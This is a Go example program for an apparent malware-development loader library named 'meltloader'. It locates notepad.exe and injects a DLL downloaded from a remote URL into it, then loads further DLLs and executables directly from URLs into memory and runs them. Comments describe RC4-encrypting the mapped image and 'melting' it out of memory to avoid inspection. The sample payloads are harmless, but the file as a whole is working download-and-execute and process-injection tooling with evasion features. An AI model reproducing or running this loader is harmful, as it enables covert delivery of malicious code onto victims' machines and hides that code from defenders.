package main

import (
	"fmt"
	"log"
	"github.com/carved4/meltloader/pkg/pe"
	"github.com/carved4/meltloader/pkg/net"
	"runtime/debug"
)

func main() {
	debug.SetGCPercent(-1)
	log.Printf("[main] start")
	// Load local test DLL that exports HostInfo (built in go-dll-src/)
	pid, pHandle, err := pe.FindTargetProcess("notepad.exe")
	if err != nil {
		log.Printf("[main] failed to find process: %v", err)
		fmt.Println("failed to find process", err)
		return
	}
	log.Printf("[main] target: pid=%d handle=0x%x", pid, pHandle)
	buff, err := net.DownloadToMemory("https://github.com/carterjones/hello-world-dll/releases/download/v1.0.0/hello-world-x64.dll")
	if err != nil {
		log.Printf("[main] failed to download DLL: %v", err)
		fmt.Println("failed to download", err)
		return
	}
	_, err = pe.LoadDLLRemote(pHandle, buff)
	if err != nil {
		log.Printf("[main] LoadDLLRemote failed: %v", err)
		fmt.Println("failed to load", err)
		return
	}
	log.Printf("[main] LoadDLLRemote succeeded")
	// the downloaded buffer is optionally encrypted for an amount of time in seconds passed as an int to LoadDLLFromURL() as demonstrated in the call above and then decrypted before execution
	// you can also call the func without the sleep parameter as displayed below
	// the mapped DLL in memory after load and execution is encrypted in place with RC4 and will not be able to be interacted with
	// if you wish to change this in your own projects, just remove the defer enc.EncryptBuffer of our mapped image
	mapping2, err := pe.LoadDLLFromURL("https://github.com/carterjones/hello-world-dll/releases/download/v1.0.0/hello-world-x64.dll", "export_only:MessageBoxThread")
	if err != nil {
		fmt.Println("failed to download", err)
	}
	// first call before melting to check how many DLLs are mapped into our process' image
	baseAddrs, sizes, count := pe.GetMap()
	fmt.Printf("currently have %d DLLs mapped:\n", count)
	for i := 0; i < count; i++ {
		fmt.Printf("DLL %d: Base=0x%X, Size=%d bytes\n", i, baseAddrs[i], sizes[i])
	}
	// call on other mapping (this takes in an interface returned into mapping and optionally unpacked for display in pe.GetMap())
	err = pe.Melt(mapping2)
	if err != nil {
		fmt.Println("failed to melt dll after load:", err)
	}
	
	// demonstrate they are no longer in our image and then close
	fmt.Println("successfuly melted dll!")
	baseAddrs, sizes, count = pe.GetMap()
	fmt.Printf("currently have %d DLLs mapped:\n", count)
	for i := 0; i < count; i++ {
		fmt.Printf("DLL %d: Base=0x%X, Size=%d bytes\n", i, baseAddrs[i], sizes[i])
	}
	// demonstrate pe loading with timer
	peMapping, err := pe.LoadPEFromURLThreadTimed("https://github.com/carved4/go-maldev/raw/refs/heads/main/generator/calc.exe", 2)
	if err != nil {
		fmt.Println("failed to load PE:", err)
	} else {
		fmt.Println("successfully loaded PE")
	}
	// demonstrate another pe load, should spawn two calcs by now then return to loader and print how many are mapped, then melt
	peMapping2, err := pe.LoadPEFromURLThreadTimed("https://github.com/carved4/go-maldev/raw/refs/heads/main/generator/calc.exe", 2)
	if err != nil {
		fmt.Println("failed to load PE:", err)
	} else {
		fmt.Println("successfully loaded PE")
	}
	// check how many PEs are currently mapped in our process
	peBaseAddrs, peSizes, peCount := pe.GetPEMap()
	fmt.Printf("currently have %d PEs mapped:\n", peCount)
	for i := 0; i < peCount; i++ {
		fmt.Printf("PE %d: Base=0x%X, Size=%d bytes\n", i, peBaseAddrs[i], peSizes[i])
	}
	err = pe.MeltPE(peMapping)
	if err != nil {
		fmt.Println("failed to melt PE after load:", err)
	}
	err = pe.MeltPE(peMapping2)
	if err != nil {
		fmt.Println("failed to melt PE after load:", err)
	}
	fmt.Println("successfuly melted PEs!")
	// verify the pe is no longer in our process image
	peBaseAddrs, peSizes, peCount = pe.GetPEMap()
	fmt.Printf("currently have %d PEs mapped:\n", peCount)
	for i := 0; i < peCount; i++ {
		fmt.Printf("PE %d: Base=0x%X, Size=%d bytes\n", i, peBaseAddrs[i], peSizes[i])
	}
}
